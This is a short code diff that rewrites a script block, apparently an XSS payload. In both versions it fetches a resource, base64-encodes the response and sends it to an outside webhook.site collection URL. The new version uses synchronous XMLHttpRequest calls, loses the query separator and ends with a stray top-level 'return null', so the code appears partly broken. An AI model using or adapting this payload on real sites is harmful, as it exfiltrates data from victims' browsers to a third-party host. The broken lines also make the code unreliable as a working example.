@@ -1,11 +1,13 @@
 <script>
-;(async function() {
+const request = new XMLHttpRequest();
+request.open("GET", "https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff", false);
+request.send(null);
 
-    const url = 'https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff'
-    response = await fetch(url)
+if (request.status === 200) {
 
-    const url2 = 'https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff?r='+btoa(response.text())
-    response2 = await fetch(url2)
-
-})()
+   const request2 = new XMLHttpRequest();
+   request2.open("GET", "https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff"+btoa(request.responseText), false);
+   request2.send(null);
+}
+return null;
 </script>
